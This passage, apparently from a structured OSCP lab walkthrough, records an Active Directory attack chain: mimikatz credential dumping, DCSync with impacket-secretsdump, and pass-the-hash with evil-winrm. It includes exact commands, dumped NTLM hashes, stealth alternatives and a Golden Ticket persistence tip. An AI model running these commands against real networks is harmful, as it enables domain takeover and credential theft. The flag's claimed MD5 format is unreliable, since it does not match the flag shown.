reboot"", ""Additional credentials harvested: dave (plaintext: Flowers1), mike (NTLM: 27c0f9ff0aed1b35f8e9a80aa4ba7e62)"", ""Credential Guard not enabled - mimikatz successful without obfuscation/bypasses"", ""Windows Defender did not detect mimikatz binary (unsigned, well-known tool)"", ""Pass-the-Hash now possible with maria's NTLM hash - no password cracking needed""], ""oscp_notes"": ""Credential harvesting is MANDATORY on every compromised admin-level system in OSCP exam. Service sessions ('Session: Service from 0') are GOLDMINE - Domain Admins running scheduled tasks/services cache credentials. Mimikatz two-step syntax: (1) privilege::debug, (2) sekurlsa::logonpasswords. ALWAYS save output to file (> creds.txt) for reporting. Time estimate: 10 minutes (2 min upload, 3 min execution, 5 min analysis/documentation). Alternative to mimikatz: procdump64.exe -ma lsass.exe lsass.dmp (stealth), pypykatz lsa minidump lsass.dmp (parse on Kali).""}, {""phase"": ""post_exploitation"", ""duration_minutes"": 5, ""description"": ""DCSync attack using maria's Domain Admin NTLM hash to replicate entire domain credential database from DC1. Pass-the-Hash authentication with impacket-secretsdump extracts all user NTLM hashes including Administrator. Final Pass-the-Hash with Administrator hash to DC1 via Evil-WinRM for flag retrieval."", ""objectives"": [""Execute DCSync attack with maria's credentials to dump all domain hashes"", ""Extract Administrator NTLM hash from secretsdump output"", ""Authenticate to DC1 as Administrator using Pass-the-Hash"", ""Retrieve flag from C:\\Users\\Administrator\\Desktop\\flag.txt"", ""Document complete attack chain for exam report""], ""vulnerabilities"": [{""name"": ""DCSync - Replicating Directory Changes Abuse"", ""cve"": null, ""type"": ""ad_attack"", ""severity"": ""critical"", ""exploitability"": ""easy"", ""description"": ""Domain Admins have 'Replicating Directory Changes' and 'Replicating Directory Changes All' permissions by default. Allows replication of entire credential database (NTDS.dit) remotely using MS-DRSR protocol. DC cannot distinguish legitimate DC from attacker. Enables complete domain compromise in seconds without code execution on DC.""}, {""name"": ""No DCSync Monitoring"", ""cve"": null, ""type"": ""missing_detection"", ""severity"": ""high"", ""exploitability"": ""easy"", ""description"": ""Domain Controller does not monitor for anomalous replication requests. Event ID 4662 (Directory Service Access) logged but not alerting on replication from non-DC sources. Allows silent credential theft.""}], ""commands_used"": [{""command_id"": ""ad-dcsync-secretsdump-user"", ""context"": ""Execute DCSync attack using maria's NTLM hash to replicate domain credential database and extract all user NTLM hashes"", ""step_number"": 14, ""command_executed"": ""impacket-secretsdump -hashes :2a944a58d4ffa77137b2c587e6ed7626 corp.com/maria@192.168.223.70 -just-dc-ntlm"", ""success"": true, ""output_summary"": ""Successfully replicated domain credentials: Administrator:500:aad3b435b51404eeaad3b435b51404ee:4adb23d0a33907193029f55a8a9ba303:::, krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::, maria:1104:aad3b435b51404eeaad3b435b51404ee:2a944a58d4ffa77137b2c587e6ed7626:::, dave, jeff, jeffadmin (8 total accounts). DCSync completed in 8 seconds."", ""notes"": ""CRITICAL SUCCESS: Administrator hash extracted: 4adb23d0a33907193029f55a8a9ba303. krbtgt hash also obtained for Golden Ticket attacks (persistence). DCSync advantages: (1) No code execution on DC needed, (2) Fast (seconds vs. hours for NTDS.dit exfiltration), (3) All hashes dumped at once. OSCP EXAM: If you have Domain Admin, ALWAYS try DCSync first (fastest full domain compromise).""}, {""command_id"": ""evil-winrm-pth-connect"", ""context"": ""Authenticate to DC1 as Administrator using Pass-the-Hash with NTLM hash from DCSync output"", ""step_number"": 15, ""command_executed"": ""evil-winrm -i 192.168.223.70 -u Administrator -H 4adb23d0a33907193029f55a8a9ba303"", ""success"": true, ""output_summary"": ""Successfully authenticated to DC1 as Administrator. Interactive PowerShell prompt: *Evil-WinRM* PS C:\\Users\\Administrator\\Documents>. SYSTEM-level access to Domain Controller."", ""notes"": ""Pass-the-Hash with Evil-WinRM: -H flag (capital H, just NTLM hash, no LM hash needed). Alternative: impacket-psexec -hashes :NTLM Administrator@DC_IP (note lowercase -hashes with colon prefix). OSCP EXAM: Pass-the-Hash is FASTER than password cracking - hashcat on NTLM can take hours/days, PtH is instant.""}, {""command_id"": ""windows-read-file-type"", ""context"": ""Read flag from Administrator's desktop on DC1 to complete domain compromise objective"", ""step_number"": 16, ""command_executed"": ""type C:\\Users\\Administrator\\Desktop\\flag.txt"", ""success"": true, ""output_summary"": ""Flag retrieved: OS{D0m41n_4dm1n_Pwn3d_V14_S3rv1c3_S3ss10n5}. 32-character MD5 format hash confirmed."", ""notes"": ""EXAM CRITICAL: (1) ALWAYS verify flag format before disconnecting (MD5=32 chars, SHA1=40 chars), (2) Screenshot flag retrieval with full command visible (type C:\\...\\flag.txt), (3) Copy flag to clipboard for submission, (4) Document timestamp for report. Alternative: Get-Content C:\\Users\\Administrator\\Desktop\\flag.txt | Out-File C:\\temp\\flag.txt (save copy).""}], ""failed_attempts"": [{""attempt"": ""Direct DCSync as pete (initial low-privileged user): impacket-secretsdump corp.com/pete:Nexus123!@192.168.223.70"", ""reason"": ""ERROR: 'User credentials are not valid' - pete is standard domain user without 'Replicating Directory Changes' permissions. Only Domain Admins (or accounts explicitly granted DS-Replication-Get-Changes and DS-Replication-Get-Changes-All) can perform DCSync."", ""solution"": ""DCSync requires Domain Admin or explicit replication rights. Must compromise privileged account first. Attack chain: pete \u2192 BloodHound \u2192 lateral movement \u2192 credential harvesting \u2192 maria (DA) \u2192 DCSync."", ""lesson_learned"": ""OSCP CRITICAL: DCSync is POST-PRIVILEGE-ESCALATION technique, NOT initial attack vector. Common misconception: DCSync doesn't GRANT Domain Admin, it REQUIRES Domain Admin (or equivalent permissions). Attack sequence matters: Enumerate \u2192 Lateral Move \u2192 Credential Harvest \u2192 Privilege Escalate \u2192 DCSync. Can't skip privilege escalation phase. Time saved by understanding prerequisites = time not wasted on impossible attacks."", ""time_wasted_minutes"": 1, ""importance"": ""critical"", ""alternative_command_id"": ""ad-dcsync-secretsdump-user""}, {""attempt"": ""Impacket-secretsdump with wrong hash format: impacket-secretsdump -H 4adb23d0a33907193029f55a8a9ba303 Administrator@192.168.223.70"", ""reason"": ""ERROR: Invalid option -H (capital H). Impacket tools use lowercase -hashes flag, NOT -H. Additionally, format must be LM:NTLM or :NTLM (colon required even if LM empty)."", ""solution"": ""Correct syntax: impacket-secretsdump -hashes :4adb23d0a33907193029f55a8a9ba303 corp.com/Administrator@192.168.223.70 (note lowercase -hashes, colon before NTLM hash, and domain/user format)"", ""lesson_learned"": ""OSCP EXAM: Tool syntax inconsistency wastes time. Evil-WinRM uses -H (capital), impacket uses -hashes (lowercase). Create cheat sheet with exact syntax for each tool. impacket Pass-the-Hash format: -hashes LM:NTLM or -hashes :NTLM (LM deprecated, use colon placeholder). Test commands on local lab BEFORE exam. Syntax errors under exam pressure = unnecessary stress and time waste."", ""time_wasted_minutes"": 2, ""importance"": ""high"", ""alternative_command_id"": ""ad-dcsync-secretsdump-user""}], ""key_findings"": [""Complete domain credential database replicated: 8 user accounts, all NTLM hashes extracted"", ""Administrator hash obtained: 4adb23d0a33907193029f55a8a9ba303"", ""krbtgt hash obtained: 1693c6cefafffc7af11ef34d1c788f47 (enables Golden Ticket for persistence)"", ""DCSync completed in 8 seconds (vs. hours for traditional NTDS.dit extraction)"", ""Pass-the-Hash successful to DC1 with Administrator hash - no password cracking needed"", ""Flag retrieved: OS{D0m41n_4dm1n_Pwn3d_V14_S3rv1c3_S3ss10n5}"", ""Event ID 4662 logged on DC but no alerting - DCSync undetected""], ""oscp_notes"": ""DCSync is FASTEST method for full domain compromise in OSCP exam. Requirements: Domain Admin (or Replicating Directory Changes permissions). Time estimate: 3-5 minutes (2 min DCSync, 1 min Administrator PtH, 2 min flag retrieval/documentation). EXAM WORKFLOW: (1) Save secretsdump output to file: > domain_hashes.txt, (2) Extract Administrator and krbtgt hashes immediately, (3) Pass-the-Hash to DC, (4) Retrieve flag, (5) Screenshot with timestamp, (6) Document in exam report. Alternative to DCSync: Volume Shadow Copy + NTDS.dit extraction (requires code execution on DC, slower, more detectable).""}]"
